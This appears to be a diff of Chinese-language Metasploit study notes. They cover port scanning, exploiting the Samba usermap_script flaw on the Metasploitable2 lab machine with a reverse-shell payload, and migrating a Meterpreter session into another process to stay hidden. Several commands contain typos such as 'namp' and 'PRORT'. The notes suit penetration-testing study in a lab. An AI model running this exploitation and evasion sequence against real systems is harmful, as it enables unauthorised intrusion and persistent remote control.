@@ -15,8 +15,8 @@
 3. 选择并配置一个攻击载荷模块
 4. 选择一个编码即使，用来绕过杀毒软件的查杀
 5. 渗透攻击
-# 主机扫描
-## 使用辅助模块进行端口扫描
+
+## 一、使用辅助模块进行端口扫描
      1.msfconsole
      2.search portscan
      3.use auxiliary/scanner/portscan/tcp
@@ -28,7 +28,64 @@
      9.run
 ## 常用的扫描模块及功能
 p193
-## 漏洞利用
+## 二、漏洞利用
   
      实验下载地址：https://sourceforge.net/projects/metasploitable/files/Metasploitable2
      默认的登录名和密码是msfadmin：msfadmin
+1. 收集目标机的信息
+
+        namp -Sv 192.168.101.135
+        发现Samba 3.x服务
+2. 搜索漏洞利用模块
+     
+       search samba
+       返回的利用列表是根据利用难度来整理的
+4. 查看漏洞详细信息
+
+       可以查看漏洞利用模块信息
+       info exploit/multi/samba/usermap_script
+5. 漏洞模块利用
+
+       use exploit/multi/samba/usermap_script
+       命令行由msf>变成msf5 exploit(multi/samba/usermap_script) > 
+6. 查看漏洞利用模块下可供的攻击载荷模块
+
+       show payloads
+7. 选择一个攻击载荷进行攻击
+
+        这里选择cmd/unix/revers反向攻击载荷模块
+        set PAYLOAD cmd/unix/reverse
+8. 设置攻击主机IP地址
+
+      set RHOST 192.168.101.135
+        
+9. 设置漏洞利用端口
+
+      set PRORT 445
+10. 设置发动攻击主机ip地址
+
+      set LHOST 192.168.101.131
+11. 输入攻击命令
+
+      exploit或者run
+
+## 四、进程迁移
+刚获取Meterpreter Shell时，该Shell是脆弱的。例如，攻击者可以利用浏览器漏洞攻陷目标机器，但攻击渗透后浏览器有可能被用户关闭，所有第一步要移动这个shell，把它和目标机中的一个文档进程绑定在一起，也不需要对磁盘进行任何写入操作，使得更安全
+1. 查看目标机正在运行的进程
+
+       meterpreter > ps
+       ps命令获取目标主机正在运行的进程
+
+2. 查看Meterpreter Shell的进程号
+
+       meterpreter > getpid
+       获取Meterpreter shell的pid进程号
+4. 迁移进程号
+
+       meterpreter > migrate 448(要迁移到的进程号)
+    进程迁移后原先的PID会自动关闭，如果没有关闭则可以使用kill 984(需要关闭的进程号)。
+
+    同样也可以使用自动迁移进程命令
+
+        run post/windows/manage/migrate
+     系统会自动寻早合适的进程然后迁移
